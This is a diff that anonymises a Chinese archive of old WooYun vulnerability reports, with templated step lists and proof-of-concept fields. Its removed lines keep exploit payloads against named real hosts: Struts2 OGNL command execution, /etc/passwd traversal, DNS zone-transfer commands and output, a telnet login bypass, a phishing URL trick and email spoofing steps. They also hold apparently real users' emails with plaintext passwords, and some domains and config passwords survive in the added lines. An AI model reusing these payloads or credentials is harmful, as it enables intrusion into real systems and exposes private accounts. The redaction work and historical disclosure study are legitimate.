-**POC**: 发现服务器IP地址：122.224.195.92系统本身的服务开的也太多了，135、139这两个风险端口就不管了先看445共享端口：没有任何验证。。。。随意打开几个文件看看：账本就算了，系统数据库结构都历历在目。。这数据敏感得不能再敏感了。没必要进行下去了，这台机器管理配置弱的不能再弱，说不定已经成为别人的肉鸡了整个网段好像都是浙江省国土厅的，相信这台机器被坏人拿下了后，整个C段估计就沦陷了。
+**POC**: 发现服务器IP地址：[IP已脱敏]系统本身的服务开的也太多了，135、139这两个风险端口就不管了先看445共享端口：没有任何验证。。。。随意打开几个文件看看：账本就算了，系统数据库结构都历历在目。。这数据敏感得不能再敏感了。没必要进行下去了，这台机器管理配置弱的不能再弱，说不定已经成为别人的肉鸡了整个网段好像都是浙江省国土厅的，相信这台机器被坏人拿下了后，整个C段估计就沦陷了。
 
 **绕过**: 直接利用
 
@@ -25660,7 +25660,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试URL：http://www.ikuai8.com/还是openssl这次跑了大概几MB的文件，很顺利的抓到了用户的HTTP请求信息。在分析爱快的登录时发现，其中username与password明文被记录在cookie当中，并且没有httponly标志通过获取的到数据成功登录了该账号
+**详情**: 测试URL：https://example.com/[已脱敏]
 
 **POC**: 登录信息如图！
 
@@ -25682,7 +25682,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 配置文件遍历：http://220.181.23.80/WEB-INF/classes/struts-config.xml标红显示为：ku6.com
+**详情**: 配置文件遍历：http://[IP已脱敏]
 
 **POC**: 数据库配置信息：
 
@@ -25692,8 +25692,8 @@
 ---
 
 ---
-### [wooyun-2011-03711] 百度风云榜暴漏百度沸点后台路径
-**厂商**: 百度 | **年份**: 2011 | **类型**: 应用配置错误
+### [wooyun-2011-03711] 某搜索引擎风云榜暴漏某搜索引擎沸点后台路径
+**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 认证接口, 后台管理
 
@@ -25704,9 +25704,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 查看百度[2011百度搜索风云榜(http://hot.baidu.com/)]的源码，一段jQuery库的引用引起注意，路径居然是http://hot.baidu.com/manager/js/jquery-1.4.2.min.js，尝试http://hot.baidu.com/manager/也居然提示登陆，扩展名是php，并且默认用户名是admin，通过经验不难看出，这是dedecms的后台。
+**详情**: 查看某搜索引擎[2011某搜索引擎搜索风云榜(https://example.com/[已脱敏])]的源码，一段jQuery库的引用引起注意，路径居然是https://example.com/[已脱敏]
 
-**POC**: 访问2011百度搜索风云榜，查询源码注意jQuery库引用<script type="text/javascript" src="http://hot.baidu.com/manager/js/jquery-1.4.2.min.js"></script>访问http://hot.baidu.com/manager/
+**POC**: 访问2011某搜索引擎搜索风云榜，查询源码注意jQuery库引用<script type="text/javascript" src="https://example.com/[已脱敏]"></script>访问https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -25770,9 +25770,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://118.144.75.63/login.actionhttp://118.144.75.34/index.action
+**详情**: http://[IP已脱敏]
 
-**POC**: http://118.144.75.34/index.action?debug=command&expression=new%20java.io.BufferedReader(new%20java.io.InputStreamReader(new%20java.lang.ProcessBuilder({'id'}).start().getInputStream())).readLine()http://118.144.75.63/login.action?&debug=command&expression=new%20java.io.BufferedReader(new%20java.io.I
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -25814,7 +25814,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://manager.17k.com/站配置不当获取数据库密码http://manager.17k.com/WEB-INF/applicationContext-slave.xml获取的数据库连接地址****db.17k.com域名解析不了，于是扫一下同段开3306端口就是其中一个，连接之。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -25860,11 +25860,11 @@
 
 **详情**: 
 
-**POC**: http://www.ijinshan.com/robots.txt/1.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 百度nginx解析漏洞修复
+**修复**: 某搜索引擎nginx解析漏洞修复
 ---
 
 ---
@@ -25880,7 +25880,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 权限设置不当开发文档暴露多个后台暴露：http://www.jxcehui.gov.cn/admin/Data/kaliz.aspx 可被爆破
+**详情**: 权限设置不当开发文档暴露多个后台暴露：https://example.com/[已脱敏] 可被爆破
 
 **POC**: 更要命的是备份数据库可以被下载。
 
@@ -25902,7 +25902,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Discuz X2.5 时区逻辑错误，导致Discuz某些应用不能正常使用比如QQ登陆
+**详情**: Discuz X2.5 时区逻辑错误，导致Discuz某些应用不能正常使用比如某互联网公司登陆
 
 **POC**: (见原文)
 
@@ -25924,7 +25924,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tuan.xywy.com/class/smarty/internals/http://tuan.xywy.com/class/fck/editor/filemanager/connectors/php/upload.phphttp://tuan.xywy.com/class/fck/editor/filemanager/connectors/php/connector.phphttp://tuan.xywy.com/class/fck/editor/filemanager/connectors/php/config.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -25979,7 +25979,7 @@
 
 ---
 ### [wooyun-2011-02912] 电信jboss 配置不当
-**厂商**: 中国电信 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -26014,7 +26014,7 @@
 
 **详情**: nginx文件解析漏洞
 
-**POC**: http://www.grandcloud.cn/robots.txt/x.php网站用的PHPCMS，找个上传点，如会员的头像上传模块。
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26034,7 +26034,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 圆通新龙你怎么就不知道举一反三呢？一个系统存在问题，怎么就不做个系统全面检查呢？安全方面可不要给圆通快递拖后腿哦~~~早上的测试对象是圆通仓配一体管理平台，测试方法和漏洞情况和上次我发的一样（WooYun: 圆通某转运系统tomcat引发的“血”案），圆通直接修复就好了，这次我就直接上图了。。。打包URL:圆通新龙主站http://www.ytoxl.com/manager/html      tomcat   tomcat圆通仓配一体管理平台http://m2.ytoxl.com/manager/html    tomcat   tomcat圆通新龙WMS系统：http://fio.ytoxl.com/manager/html      tomcat   tomcat
+**详情**: 圆通新龙你怎么就不知道举一反三呢？一个系统存在问题，怎么就不做个系统全面检查呢？安全方面可不要给圆通快递拖后腿哦~~~早上的测试对象是圆通仓配一体管理平台，测试方法和漏洞情况和上次我发的一样（WooYun: 圆通某转运系统tomcat引发的“血”案），圆通直接修复就好了，这次我就直接上图了。。。打包URL:圆通新龙主站https://example.com/[已脱敏]      tomcat   tomcat圆通仓配一体管理平台https://example.com/[已脱敏]    tomcat   tomcat圆通新龙WMS系统：https://example.com/[已脱敏]      tomcat   tomcat
 
 **POC**: 圆通新龙主站圆通新龙WMS系统
 
@@ -26056,7 +26056,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://info.caipiao.suning.com/leagueimg/092.gif/.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -26078,7 +26078,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.apache.org/server-statusserver-status没有限制访问，导致信息泄漏。泄漏的信息点：1,Apache Server Status for www.apache.org (via 140.211.11.131) 这个说明泄露了真实ip，不过经过测试apache也没有做cdn，应该有做负载均衡，有时候刷新，这个说明的ip会变成另外一个，经测试直接访问ipapache的主页。2,Server uptime: 3 days 4 hours 48 minutes 43 secondsServer load: 8.24 8.77 9.57Total accesses: 35420283 - Total Traffic: 1706.5 GBCPU Usage: u4146.86 s1566 cu0 cs0 - 2.07% CPU load128 re
+**详情**: https://example.com/[已脱敏] Server Status for www.apache.org (via [IP已脱敏]) 这个说明泄露了真实ip，不过经过测试apache也没有做cdn，应该有做负载均衡，有时候刷新，这个说明的ip会变成另外一个，经测试直接访问ipapache的主页。2,Server uptime: 3 days 4 hours 48 minutes 43 secondsServer load: 8.24 8.77 9.57Total accesses: 35420283 - Total Traffic: 1706.5 GBCPU Usage: u4146.86 s1566 cu0 cs0 - 2.07% CPU load128 re
 
 **POC**: (见原文)
 
@@ -26100,7 +26100,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://developer.playcrab.com/public/projectsgitlab的公共项目一个蛋疼的问题
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 后面有地址 直接可下载，这里就不演示了
 
@@ -26166,7 +26166,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：113.57.193.145  应该是湖北联通114的。交换机是cisco3550，推测vty是这样配置的line vty 0 4password 7 051A0E1B27loginline vty 5 15no login这样的话，终端5到15是不需要密码也可以登录的，因为cisco规定终端只能按顺序从0开始连接，所以我们只需用6个telnet连过去即可绕过～当然登录进去只是普通的用户模式，进特权模式是需要enable密码的，不过还是泄漏了一些配置信息。貌似乌云上没有类似的案例，于是提交了吧 >.<
+**详情**: 地址：[IP已脱敏]  应该是湖北联通114的。交换机是cisco3550，推测vty是这样配置的line vty 0 4password 7 051A0E1B27loginline vty 5 15no login这样的话，终端5到15是不需要密码也可以登录的，因为cisco规定终端只能按顺序从0开始连接，所以我们只需用6个telnet连过去即可绕过～当然登录进去只是普通的用户模式，进特权模式是需要enable密码的，不过还是泄漏了一些配置信息。貌似乌云上没有类似的案例，于是提交了吧 >.<
 
 **POC**: 在详细说明里了。
 
@@ -26188,7 +26188,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://f16.7daysinn.cn:8080/log/serverLog看下22号的http://f16.7daysinn.cn:8080/log/serverLog/localhost_access_log.2015-03-22.txt这是在干嘛...每天都有人来看看http://f16.7daysinn.cn:8080/log/appLog/app-info.log
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -26198,8 +26198,8 @@
 ---
 
 ---
-### [wooyun-2012-06875] 新浪网某站疑似废弃页面
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-06875] 某社交平台网某站疑似废弃页面
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -26210,9 +26210,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://php.tech.sina.com.cn/digi/cgi-bin/search.php?style=1&module=searchhttp://php.tech.sina.com.cn/search/search.php?style=1&module=compsea1&manu_name=找到某连接，里面有百度推广http://comment4.news.sina.com.cn/comment/skin/default.html?
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://comment4.news.sina.com.cn/comment/skin/default.html?
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26232,7 +26232,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞存在站点 http://beian.021.net/备案中心上传 合成后门的照片
+**详情**: 漏洞存在站点 https://example.com/[已脱敏] 合成后门的照片
 
 **POC**: 那些黑备案是不是就这样出现的?
 
@@ -26276,9 +26276,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ucenter.b5m.com/tologin.htmhttp://op.t.b5m.com/http://adm.b5m.com/http://mail.b5m.com/都没有限制哦..
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://ucenter.b5m.com/tologin.htmhttp://op.t.b5m.com/http://adm.b5m.com/http://mail.b5m.com/都没有限制哦..
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26298,7 +26298,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标网站：http://www.nhfpc.gov.cn/; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> axfr @dns.nhfpc.gov.cn nhfpc.gov.cn; (1 server found);; global options: +cmdnhfpc.gov.cn.		86400	IN	SOA	dns.nhfpc.gov.cn. root.dns.nhfpc.gov.cn. 1053891162 10800 900 604800 86400nhfpc.gov.cn.		86400	IN	NS	dns.nhfpc.gov.cn.nhfpc.gov.cn.		86400	IN	MX	5 smg.nhfpc.gov.cn.nhfpc.gov.cn.		86400	IN	MX	10 mail.nhfpc.gov.cn.chsi.nhfpc.gov.c
+**详情**: 目标网站：https://example.com/[已脱敏] <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> axfr @dns.nhfpc.gov.cn nhfpc.gov.cn; (1 server found);; global options: +cmdnhfpc.gov.cn.		86400	IN	SOA	dns.nhfpc.gov.cn. root.dns.nhfpc.gov.cn. 1053891162 10800 900 604800 86400nhfpc.gov.cn.		86400	IN	NS	dns.nhfpc.gov.cn.nhfpc.gov.cn.		86400	IN	MX	5 smg.nhfpc.gov.cn.nhfpc.gov.cn.		86400	IN	MX	10 mail.nhfpc.gov.cn.chsi.nhfpc.gov.c
 
 **POC**: ; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> axfr @dns.nhfpc.gov.cn nhfpc.gov.cn; (1 server found);; global options: +cmdnhfpc.gov.cn.		86400	IN	SOA	dns.nhfpc.gov.cn. root.dns.nhfpc.gov.cn. 1053891162 10800 900 604800 86400nhfpc.gov.cn.		86400	IN	NS	dns.nhfpc.gov.cn.nhfpc.gov.cn.		86400	IN	MX	5 smg.nhfpc.
 
@@ -26408,7 +26408,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 所有的错误信息都暴露出来了，我是渣渣小白，不会利用，但这些debug信息直接暴露出来总是不好的。。。小白表示只是看到了这个页面有点问题，不会利用 T_T报了卖个萌http://www1.scuec.edu.cn/smkx/newsopen.php?id=1
+**详情**: 所有的错误信息都暴露出来了，我是渣渣小白，不会利用，但这些debug信息直接暴露出来总是不好的。。。小白表示只是看到了这个页面有点问题，不会利用 T_T报了卖个萌https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -26432,7 +26432,7 @@
 
 **详情**: 首先存在 显示目录列表的问题 可以遍历网站结构网站系统用的是phpshe 这个在乌云搜了下 可以看到漏洞一大把而且厂商貌似不是太负责啊然后根据上面的说名 把 数据库给备份下来了然后 加上上面的 ‘显示目录列表’问题 就能看到真实的数据备份文件地址
 
-**POC**: import urllib2import urlliburl='http://www.majiajia.cc/index.php?mod=../admin/db'def post(url, data):req = urllib2.Request(url)data = urllib.urlencode(data)#enable cookieopener = urllib2.build_opener(urllib2.HTTPCookieProcessor())response = opener.open(req, data)return response.read()data =  {'pebac
+**POC**: import urllib2import urlliburl='https://example.com/[已脱敏]'def post(url, data):req = urllib2.Request(url)data = urllib.urlencode(data)#enable cookieopener = urllib2.build_opener(urllib2.HTTPCookieProcessor())response = opener.open(req, data)return response.read()data =  {'pebac
 
 **绕过**: 直接利用
 
@@ -26452,7 +26452,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://rdscm.midea.com.cn:7008/http://58.252.101.32:8000/export/大量xls表格：
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -26474,7 +26474,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一起发http://221.122.127.14:8080/phpLDAPadmin直接选“匿名” 登录+--> dc=emarssp.com (6)---> cn=123---> cn=Manager+--> o=extmailAccount (4)| +--> virtualDomain=emarssp.com (20)| | ---> mail=changnannan@emarssp.com| | ---> mail=emara@emarssp.com| | ---> mail=fengyubiao@emarssp.com| | ---> mail=gongjiadong@emarssp.com| | ---> mail=guanchenglong@emarssp.com| | ---> mail=heming@emarssp.com| | ---> mail=huangguolia
+**详情**: 一起发http://[IP已脱敏] 登录+--> dc=emarssp.com (6)---> cn=123---> cn=Manager+--> o=extmailAccount (4)| +--> virtualDomain=emarssp.com (20)| | ---> mail=changnannan@emarssp.com| | ---> mail=emara@emarssp.com| | ---> mail=fengyubiao@emarssp.com| | ---> mail=gongjiadong@emarssp.com| | ---> mail=guanchenglong@emarssp.com| | ---> mail=heming@emarssp.com| | ---> mail=huangguolia
 
 **POC**: ···
 
@@ -26484,8 +26484,8 @@
 ---
 
 ---
-### [wooyun-2012-04771] 中国移动 免验证码 做短信攻击用。
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-04771] 某运营商 免验证码 做短信攻击用。
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -26496,7 +26496,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.gx.10086.cn/1253200/Perclerk/sendsmscode.asp?telno=手机号求话费求m值。求美女，求陪同。求关注。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -26540,7 +26540,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某云厂商的生产环境云平台，其LVS server（172.16.2.51/52）通过漏洞检测平台扫描，发现“NTP monlist Command Enabled”漏洞，其可被利用实施反射性拒绝服务攻击，该放大型攻击使用很少资源打出大流量攻击，使目标带宽或资源耗尽。尤其值得警惕的是，当前lvs的udp123被映射到公网（61.146.164.2/66）访问（以实现时钟同步）。这也就意味着，这种漏洞若被人利用，核心业务pass平台随时面临对外停止服务或瘫痪可能。通过Metasploit或kali实施拒绝攻击测试，可以将流量放大超过100倍。即10兆的就可以打出1000m的攻击流量。
+**详情**: 某云厂商的生产环境云平台，其LVS server（[IP已脱敏] monlist Command Enabled”漏洞，其可被利用实施反射性拒绝服务攻击，该放大型攻击使用很少资源打出大流量攻击，使目标带宽或资源耗尽。尤其值得警惕的是，当前lvs的udp123被映射到公网（[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -26594,8 +26594,8 @@
 ---
 
 ---
-### [wooyun-2015-0110476] 网易某处接口不严可导致用户密码泄漏
-**厂商**: 网易 | **年份**: 2015 | **类型**: 应用配置错误
+### [wooyun-2015-0110476] 某互联网公司某处接口不严可导致用户密码泄漏
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -26606,9 +26606,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 打开http://hi.163.com/qn/?username=skur1314@163.com&password=skur520.&captcha=9xcbk&autologin=on&loginbtn=%B5%C7%C2%BC%D6%D0%A1%AD&lgwin=true其中用户密码全部暴露了http://hi.163.com/qn?username=fuyue19910924@163.com&password=fuyue37027&captcha=kaxee&loginbtn=%B5%C7%C2%BC%D6%D0%A1%AD登录看看fuyue19910924@163.com&password=fuyue37027再看另外1个skur1314@163.com&password=skur520.
+**详情**: 打开https://example.com/[已脱敏]
 
-**POC**: http://hi.163.com/qn/?username=skur1314@163.com&password=skur520.&captcha=9xcbk&autologin=on&loginbtn=%B5%C7%C2%BC%D6%D0%A1%AD&lgwin=truehttp://hi.163.com/qn?username=fuyue19910924@163.com&password=fuyue37027&captcha=kaxee&loginbtn=%B5%C7%C2%BC%D6%D0%A1%AD
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26628,7 +26628,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://114.112.70.134/memcache配置不当导致信息泄漏total:4835348越看数据量越大！！！
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -26674,7 +26674,7 @@
 
 **详情**: nslookup==>指定server为ns.wahaha.com.cn==>设置类型为axfr.之后如下> set type=axfr> ls -d wahaha.com.cn[ns.wahaha.com.cn]wahaha.com.cn.                 SOA    sanweb.wahaha.com.cn root.wahaha.com.cn(964089799 10800 3600 604800 86400)wahaha.com.cn.                 MX     0    tst.wahaha.com.cnwahaha.com.cn.                 NS     ns.wahaha.com.cnwahaha.com.cn.                 NS     sanweb.wahaha.com.cn2013oa   
 
-**POC**: C:\Users\XXX>nslookup默认服务器:  google-public-dns-a.gAddress:  8.8.8.8> server ns.wahaha.com.cn默认服务器:  ns.wahaha.com.cnAddress:  60.12.5.28> set type=axfr> ls -d wahaha.com.cn[ns.wahaha.com.cn]wahaha.com.cn.                 SOA    sanweb.wahaha.com.cn root.wahaha.com.cn(964089799 10800 3600 604800 8640
+**POC**: C:\Users\XXX>nslookup默认服务器:  google-public-dns-a.gAddress:  [IP已脱敏]> server ns.wahaha.com.cn默认服务器:  ns.wahaha.com.cnAddress:  [IP已脱敏]> set type=axfr> ls -d wahaha.com.cn[ns.wahaha.com.cn]wahaha.com.cn.                 SOA    sanweb.wahaha.com.cn root.wahaha.com.cn(964089799 10800 3600 604800 8640
 
 **绕过**: 直接利用
 
@@ -26716,7 +26716,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://60.2.213.82:80/	Microsoft-IIS/6.0	put	京秦高速公路迁西支线工程河北省京秦高速公路迁西支线工程http://60.2.213.82/20143124113103.asp;.txt                      密码z
+**详情**: http://[IP已脱敏]	Microsoft-IIS/6.0	put	京秦高速公路迁西支线工程河北省京秦高速公路迁西支线工程http://[IP已脱敏]                      密码z
 
 **POC**: (见原文)
 
@@ -26784,7 +26784,7 @@
 
 **详情**: 珍爱网文件泄露由于j2ee环境配置错误，导致可以以应用的身份读取服务器上任意文件，导致巨大的风险trace信息如下
 
-**POC**: http://bj.zhenai.com/../../../../etc/passwd
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26806,7 +26806,7 @@
 
 **详情**: ThinkSNS存在dns域传送漏洞可获取其域内地址
 
-**POC**: 所属域为：thinksns.com使用nslookup查看其dns服务器信息：其中ns4.01isp.net服务器存在dns域传送漏洞，利用该漏洞可获取其域内的相关地址获取的域名信息thinksns.com.                  MX     5    mxbiz1.qq.comthinksns.com.                  MX     10   mxbiz2.qq.comthinksns.com.                  A      121.199.57.54thinksns.com.                  NS     ns3.01is
+**POC**: 所属域为：thinksns.com使用nslookup查看其dns服务器信息：其中ns4.01isp.net服务器存在dns域传送漏洞，利用该漏洞可获取其域内的相关地址获取的域名信息thinksns.com.                  MX     5    mxbiz1.某互联网公司.comthinksns.com.                  MX     10   mxbiz2.某互联网公司.comthinksns.com.                  A      [IP已脱敏]thinksns.com.                  NS     ns3.01is
 
 **绕过**: 直接利用
 
@@ -26828,7 +26828,7 @@
 
 **详情**: 关键词：inurl:EduPlate/GoodoBlog文件:edittest/demo_all_cs.aspx配置不到默认的账号密码：Line 15:   <system.web>Line 16:   <identity impersonate="true" userName="youming" password="123456"/>Line 17: 		<anonymousIdentification enabled="true"/>Line 18: 		<compilation defaultLanguage="C#">Line 19: 		</compilation>导致直接明文泄露出来。
 
-**POC**: 相关案例：http://www.huiminxx.edu.sh.cn/hmxx/edittest/demo_all_cs.aspxhttp://mail.yanji.edu.sh.cn/oa/edittest/demo_all_cs.aspxhttp://syxx.mhedu.sh.cn/edittest/demo_all_cs.aspx
+**POC**: 相关案例：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26870,7 +26870,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注册用户，前台留言，C32给图片插入一句话然后上传，KOhttp://113.107.24.234/data/feedbackimg/867_20131219dvpudo.png/1.php
+**详情**: 注册用户，前台留言，C32给图片插入一句话然后上传，KOhttp://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -26892,9 +26892,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜狗、360、遨游还有世纪之窗等几个浏览器都是差不多的！当初软件开发是基于IE6的内核系统的。现今IE6早就已经更新现在在IE6中打开http://www.baidu.com@wooyun.org   回显“语法错误”信息过滤了"@"字符但是现在搜狗、360、遨游还有世纪之窗等浏览器均不出现回显错误而是直接跳转至地址http://wooyun.org假设某论坛支持HTML代码则发帖内容为：&lt;a href="https://mybank.icbc.com.cn/icbc/perbank/regtip.jsp@www.sina.com.cn/"&gt;http://www.icbc.com.cn/&lt;/a&gt;那么如果用户使用的是上述几个浏览器之一，看到的信息是http://www.icbc.com.cn但是点击进入的实际地址却是www.sina.com（如果是钓鱼地址呢……）
+**详情**: 搜狗、360、遨游还有世纪之窗等几个浏览器都是差不多的！当初软件开发是基于IE6的内核系统的。现今IE6早就已经更新现在在IE6中打开https://example.com/[已脱敏]   回显“语法错误”信息过滤了"@"字符但是现在搜狗、360、遨游还有世纪之窗等浏览器均不出现回显错误而是直接跳转至地址https://example.com/[已脱敏] href="https://example.com/[已脱敏]"&gt;https://example.com/[已脱敏]
 
-**POC**: 假设某论坛支持HTML代码则发帖内容为：&lt;a href="https://mybank.icbc.com.cn/icbc/perbank/regtip.jsp@www.sina.com.cn/"&gt;http://www.icbc.com.cn/&lt;/a&gt;那么如果用户使用的是上述几个浏览器之一，看到的信息是http://www.icbc.com.cn但是点击进入的实际地址却是www.sina.com（如果是钓鱼地址呢……）
+**POC**: 假设某论坛支持HTML代码则发帖内容为：&lt;a href="https://example.com/[已脱敏]"&gt;https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26914,9 +26914,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://uqwk.com/utility/convert/index.php根据漏洞可以直接加上一句话木马
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://uqwk.com/utility/convert/index.php根据漏洞可以直接加上一句话木马
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26938,7 +26938,7 @@
 
 **详情**: 
 
-**POC**: http://wiki.dev.renren.com/mediawiki/AdminSettings.samplehttp://wiki.dev.renren.com/mediawiki/includes/normal/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -26958,13 +26958,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 58.215.190.216 MongoDB配置不当
+**详情**: [IP已脱敏] MongoDB配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 启用 auth 指定 IP访问请参照 http://www.oschina.net/translate/10-tips-improve-mongodb
+**修复**: 启用 auth 指定 IP访问请参照 https://example.com/[已脱敏]
 ---
 
 ---
@@ -26980,9 +26980,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: WooYun: 爱康国宾齿科某处配置不当泄露众多会员信息在该站http://a.ikangdental.com下有个log文件夹，里面存放着账号密码，厂商修复为：直接访问http://a.ikangdental.com/log已经403禁止访问了，但是直接访问下层目录就可以访问了。。http://a.ikangdental.com/log/2015-04-21.txt
+**详情**: WooYun: 爱康国宾齿科某处配置不当泄露众多会员信息在该站https://example.com/[已脱敏]
 
-**POC**: 这。。修的也太草率了，后面的是按日期生成的txt文档，完全有规律有木有http://a.ikangdental.com/log/2015-04-22.txthttp://a.ikangdental.com/log/2015-04-23.txthttp://a.ikangdental.com/log/2015-04-24.txt直接遍历就可以得到大量账户密码，任意登录一个
+**POC**: 这。。修的也太草率了，后面的是按日期生成的txt文档，完全有规律有木有https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27002,7 +27002,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://220.181.2.185http://220.181.2.185:8000/../../../../../../../../../../../../../../../etc/passwd
+**详情**: http://[IP已脱敏]http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -27026,7 +27026,7 @@
 
 **详情**: 安踏体育采用FCKeditor编译器。遍历目录可以找到FCKeditor文件夹。。。
 
-**POC**: http://www.anta.com/modules/es_cms/_FCK/http://www.anta.com/home/http://www.anta.com/cert/http://www.anta.com/log/http://www.anta.com/services/http://www.anta.com/pic/http://www.anta.com/downloads/http://www.anta.com/common/http://www.anta.com/bbs/styles/http://www.anta.com/award/http://www.anta.com
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27034,8 +27034,8 @@
 ---
 
 ---
-### [wooyun-2015-0115909] 携程旅游网服务器配置不当可直接导致官方邮件劫持（邮件伪造与防识别原理）
-**厂商**: 携程旅行网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0115909] 某旅游平台旅游网服务器配置不当可直接导致官方邮件劫持（邮件伪造与防识别原理）
+**厂商**: 某旅游平台旅行网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -27046,13 +27046,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 之前提交了 http://wooyun.org/bugs/wooyun-2015-0114708(标题:一种可大规模定向钓鱼携程旅游网千万用户的攻击过程重放（附案例，非携程用户依然躺枪）这个比较鸡肋，因为还需要高深的html技术去构造，并且后面的表单并不能去掉，只能在一块区域自定义内容那么so，附上直接版的吧，大招。携程有两个域名ctrip.com 和 c-ctrip.com; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> -t ctrip.com;; global options: +cmd;; Got answer:;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16330;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL
+**详情**: 之前提交了 https://example.com/[已脱敏] 和 c-ctrip.com; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> -t ctrip.com;; global options: +cmd;; Got answer:;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16330;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL
 
-**POC**: 伪造csrc@c-ctrip.com搭建一个邮局服务器添加域名c-ctrip.com添加用户csrc自定义邮件发给自己（茫茫用户中的小小一个）(亲，携程邀请你去看5月28号的多啦A梦：伴我同行）
